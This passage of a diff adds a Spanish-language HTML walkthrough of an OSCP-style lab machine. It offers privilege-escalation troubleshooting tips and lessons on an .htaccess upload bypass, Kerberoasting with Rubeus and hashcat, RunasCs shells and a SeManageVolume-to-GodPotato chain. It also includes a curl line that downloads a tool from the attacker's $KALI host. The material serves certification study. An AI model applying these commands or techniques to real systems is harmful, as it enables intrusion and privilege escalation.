+<p class="why">Si un exploit/script de ACL sobre <code>C:\</code> no "baja" a subcarpetas protegidas como <code>System32</code>, no es que falle: la herencia está cortada. Usa el <b>exploit oficial</b> (que fuerza la propagación recursiva) en vez de un script casero, o apunta el exploit directamente al subdirectorio que necesitas.</p>
+
+<h3>2 · RunasCs.exe (binario) falla con cuentas de dominio limitadas</h3>
+<p class="why">Errores de <b>logon type / UAC</b> al usar el binario. Cambia al script <code>Invoke-RunasCs.ps1</code> con <code>-Remote</code>: es más fiable para obtener una sesión interactiva real con una cuenta de dominio restringida.</p>
+
+<h3>3 · No todas las carpetas "estándar" son escribibles</h3>
+<p class="why"><code>C:\Windows\Temp</code> <b>no</b> era escribible para <code>svc_mssql</code>. Si una herramienta falla al escribir ahí, prueba <code>C:\ProgramData</code> u otra carpeta. No asumas que Temp siempre funciona.</p>
+<div class="code"><pre>echo test &gt; C:\ProgramData\poc.txt &amp;&amp; dir C:\ProgramData\poc.txt
+<span class="cmt"># confirma que puedes escribir ANTES de subir el exploit</span></pre></div>
+
+<h3>4 · certutil da errores de WinHTTP engañosos</h3>
+<p class="why">Un error <code>WinHTTP ... 12004</code> de <code>certutil</code> suele ser de <b>permisos de escritura</b>, no de red. Si falla, no asumas que la red está rota: prueba con <code>curl.exe</code> nativo o <code>Invoke-WebRequest</code> para ver el error real, y escribe a una carpeta donde tengas permisos.</p>
+<div class="code"><pre>curl.exe -o C:\ProgramData\tool.exe http://$KALI/tool.exe
+<span class="cmt"># o: Invoke-WebRequest http://$KALI/tool.exe -OutFile C:\ProgramData\tool.exe</span></pre></div>
+
+<h3>5 · Verifica cada escritura con un archivo de prueba</h3>
+<p class="why">Antes de asumir que un exploit de privilegios funcionó, confirma que la escritura <b>realmente llegó</b> a donde se necesita. Un <code>echo test &gt; ruta\poc.txt</code> seguido de <code>dir</code> te ahorra horas persiguiendo un exploit que fallaba sólo por permisos de carpeta.</p>
+</section>
+
+<!-- ============ LECCIONES ============ -->
+<section id="lecciones">
+<h2><span class="n">LC</span>Lecciones clave</h2>
+<ul class="notes">
+  <li><b>Upload bypass por configuración, no por nombre:</b> si filtran <code>.php</code>, un <code>.htaccess</code> con <code>AddType</code> convierte cualquier extensión en ejecutable. Comprueba que la carpeta de uploads permite <code>.htaccess</code>.</li>
+  <li><b>Kerberoasting sólo necesita una credencial de dominio.</b> <code>setspn</code> (nativo) + Rubeus + hashcat <code>-m 13100</code>. Contraseñas de servicio débiles caen con rockyou.</li>
+  <li><b>Credenciales válidas ≠ cualquier canal.</b> WinRM exige pertenecer a <i>Remote Management Users</i>. Si falla, SMB confirma que la credencial sirve y usas <code>Invoke-RunasCs -Remote</code> para la shell.</li>
+  <li><b>La cadena de privesc es una escalera de cuentas de servicio:</b> SeManageVolume (ACL sobre C:\) → DLL hijack (NETWORK SERVICE) → SeImpersonate/GodPotato (SYSTEM).</li>
+  <li><b>Herramienta oficial &gt; script casero</b> cuando el abuso depende de propagación de ACLs.</li>
+  <li><b>Verifica, no asumas.</b> La mayoría de los "el exploit no funciona" de esta máquina eran permisos de carpeta o herencia de ACL, no el exploit en sí.</li>
+</ul>
+<p class="foot">Walkthrough de la máquina Access · complemento de la cheatsheet y las study notes de AD del proyecto. Material de preparación para certificación autorizada (laboratorio/examen OSCP). Ajusta IPs, dominios y rutas a tu entorno. Cadena resuelta de forma interactiva; estas notas la reconstruyen paso a paso para estudio.</p>
+</section>
+
+</main>
+</div>
+<script>
+(function(){
+  document.querySelectorAll('.code').forEach(function(box){
+    var pre=box.querySelector('pre'); if(!pre)return;
+    var b=document.createElement('button'); b.className='cp'; b.textContent='Copiar';
+    b.addEventListener('click',function(){
+      var t=pre.innerText;
+      function done(){b.textContent='¡Copiado!';b.classList.add('ok');setTimeout(function(){b.textContent='Copiar';b.classList.remove('ok');},1200);}
+      try{navigator.clipboard.writeText(t).then(done,function(){sel();});}catch(e){sel();}
+      function sel(){var r=document.createRange();r.selectNodeContents(pre);var s=getSelection();s.removeAllRanges();s.addRange(r);try{document.execCommand('copy');done();}catch(_){}}
+    });
+    box.appendChild(b);
+  });
+  var nav=document.getElementById('nav'), mbtn=document.getElementById('mbtn');
+  if(mbtn){mbtn.addEventListener('click',function(){nav.classList.toggle('open');});}
+  nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('open');});});
+  var links=[].slice.call(nav.querySelectorAll('a[href^="#"]'));
+  var map={}; links.forEach(function(a){map[a.getAttribute('href').slice(1)]=a;});
+  var obs=new IntersectionObserver(function(es){
+    es.forEach(function(e){ if(e.isIntersecting){
+      links.forEach(function(l){l.classList.remove('active');});
+      var a=map[e.target.id]; if(a)a.classList.add('active');
+    }});
+  },{rootMargin:'-20% 0px -70% 0px'});
+  document.querySelectorAll('section[id]').forEach(function(s){obs.observe(s);});
+  var search=document.getElementById('search');
+  var sections=[].slice.call(document.querySelectorAll('section[id]'));
+  search.addEventListener('input',function(){
+    var q=search.value.trim().toLowerCase();
+    sections.forEach(function(s){
+      var hit = q==='' || s.innerText.toLowerCase().indexOf(q)!==-1;
+      s.classList.toggle('hidden-s',!hit);
+    });
+    links.forEach(function(a){
+      var id=a.getAttribute('href').slice(1); var s=document.getElementById(id);
+      if(s) a.style.opacity = s.classList.contains('hidden-s') ? .35 : 1;
+    });
+  });
+  var tbtn=document.getElementById('theme');
+  function cur(){var e=document.documentElement.getAttribute('data-theme');if(e)return e;return matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light';}
+  tbtn.addEventListener('click',function(){
+    var next=cur()==='dark'?'light':'dark';
+    document.documentElement.setAttribute('data-theme',next);
+    try{localStorage.setItem('oscp-theme',next);}catch(e){}
+  });
+  try{var sv=localStorage.getItem('oscp-theme');if(sv)document.documentElement.setAttribute('data-theme',sv);}catch(e){}
+})();
+</script>
+</body>
+</html>
